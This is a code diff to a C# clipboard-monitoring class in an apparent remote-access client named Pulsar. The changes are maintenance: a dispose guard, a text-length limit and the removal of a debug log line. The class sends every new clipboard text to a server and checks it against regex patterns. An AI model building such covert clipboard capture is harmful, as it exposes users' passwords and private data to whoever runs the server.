@@ -19,6 +19,7 @@ namespace Pulsar.Client.User
         private readonly SynchronizationContext _syncContext;
         private string _lastClipboardText = "";
         private bool _isEnabled = false;
+        private bool _disposed;
         
         private const int WM_CLIPBOARDUPDATE = 0x031D;
 
@@ -74,7 +75,7 @@ namespace Pulsar.Client.User
 
         protected override void WndProc(ref Message m)
         {
-            if (m.Msg == WM_CLIPBOARDUPDATE)
+            if (!_disposed && m.Msg == WM_CLIPBOARDUPDATE)
             {
                 ClipboardCheck();
             }
@@ -96,6 +97,9 @@ namespace Pulsar.Client.User
                     {
                         return;
                     }
+
+                    if (clipboardText != null && clipboardText.Length > Pulsar.Common.Networking.MessageInputLimits.MaxStringLength)
+                        return;
 
                     bool isNewText = clipboardText != _lastClipboardText;
                     bool shouldProcess = isNewText || forceSend;
@@ -124,8 +128,6 @@ namespace Pulsar.Client.User
                             Debug.WriteLine(forceSend && !isNewText
                                 ? "Clipboard sync enabled, sending current clipboard snapshot to server..."
                                 : "New clipboard text detected, notifying server...");
-                            Debug.WriteLine($"Client detected clipboard change: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
-
                             _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
 
                             foreach (var pattern in _regexPatterns)
@@ -179,8 +181,9 @@ namespace Pulsar.Client.User
 
         protected virtual void Dispose(bool disposing)
         {
-            if (disposing)
+            if (disposing && !_disposed)
             {
+                _disposed = true;
                 if (this.Handle != IntPtr.Zero)
                 {
                     RemoveClipboardFormatListener(this.Handle);
